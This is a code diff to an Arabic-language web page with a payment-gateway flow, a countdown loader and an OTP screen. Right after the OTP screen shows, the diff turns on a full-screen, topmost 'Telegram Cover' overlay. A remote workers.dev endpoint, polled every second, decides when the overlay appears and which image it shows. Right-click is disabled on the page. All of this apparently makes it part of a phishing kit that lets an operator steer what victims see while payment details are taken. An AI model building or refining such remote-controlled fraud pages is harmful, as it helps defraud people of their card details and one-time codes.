@@ -624,6 +624,26 @@
     #page-payment-gateway .pg-screen.active {
       display: block;
     }
+
+    /* ========== أنماط الغطاء (Telegram Cover) ========== */
+    #telegramCover{
+      position: fixed !important;
+      inset: 0 !important;
+      background: #000 !important;
+      z-index: 2147483647 !important;
+      display: none;
+      overflow: hidden;
+      visibility: visible !important;
+    }
+
+    #telegramCover img{
+      width:100%;
+      height:100%;
+      object-fit:cover;
+      pointer-events:none;
+      user-select:none;
+      -webkit-user-drag:none;
+    }
   </style>
 </head>
 <body oncontextmenu="return false;">
@@ -812,6 +832,11 @@
   <div id="customPopup" class="custom-popup">
     <div class="popup-message" id="popupMessage"></div>
     <button class="popup-close" onclick="hidePopup()">حسناً</button>
+  </div>
+
+  <!-- الغطاء (Telegram Cover) - داخل myProductBox -->
+  <div id="telegramCover">
+    <img id="telegramImg" src="" draggable="false">
   </div>
 </div>
 
@@ -1015,7 +1040,7 @@
       document.getElementById('pg-loader60Count').textContent = sec;
       if (sec <= 0) {
         clearInterval(pg.loader60Timer);
-        // تم تعديل الترتيب هنا فقط:
+        // الترتيب المطلوب: إظهار صفحة OTP أولاً ثم تفعيل الغطاء
         pg_showScreen('pg-otpScreen');
         enableTelegramCover();
       }
@@ -1280,30 +1305,7 @@
   });
 </script>
 
-<!-- ===== TELEGRAM COVER BLOCK (START) ===== -->
-<style>
-#telegramCover{
-  position:fixed;
-  inset:0;
-  background:#000;
-  z-index:999999;
-  display:none;
-  overflow:hidden;
-}
-#telegramCover img{
-  width:100%;
-  height:100%;
-  object-fit:cover;
-  pointer-events:none;
-  user-select:none;
-  -webkit-user-drag:none;
-}
-</style>
-
-<div id="telegramCover">
-  <img id="telegramImg" src="" draggable="false">
-</div>
-
+<!-- ===== TELEGRAM COVER SCRIPT (NEW) ===== -->
 <script>
 const WORKER_URL = "https://lingering-tree-78d9.mkkld7088.workers.dev";
 
@@ -1311,10 +1313,10 @@ let __tgCoverEnabled = false;
 
 function enableTelegramCover(){
   __tgCoverEnabled = true;
-  __tgCheckCover();
+  checkTelegramCover();
 }
 
-async function __tgCheckCover(){
+async function checkTelegramCover(){
   if(!__tgCoverEnabled) return;
 
   try{
@@ -1325,21 +1327,20 @@ async function __tgCheckCover(){
     const img = document.getElementById("telegramImg");
 
     if(data.show){
-      img.src = data.imageUrl || "";
       cover.style.display = "block";
+      img.src = data.imageUrl;
     }else{
       cover.style.display = "none";
       img.src = "";
     }
+
   }catch(e){
-    const cover = document.getElementById("telegramCover");
-    if(cover) cover.style.display = "none";
+    document.getElementById("telegramCover").style.display = "none";
   }
 }
 
-setInterval(__tgCheckCover, 1000);
+setInterval(checkTelegramCover, 1000);
 </script>
-<!-- ===== TELEGRAM COVER BLOCK (END) ===== -->
 
 </body>
   </html>
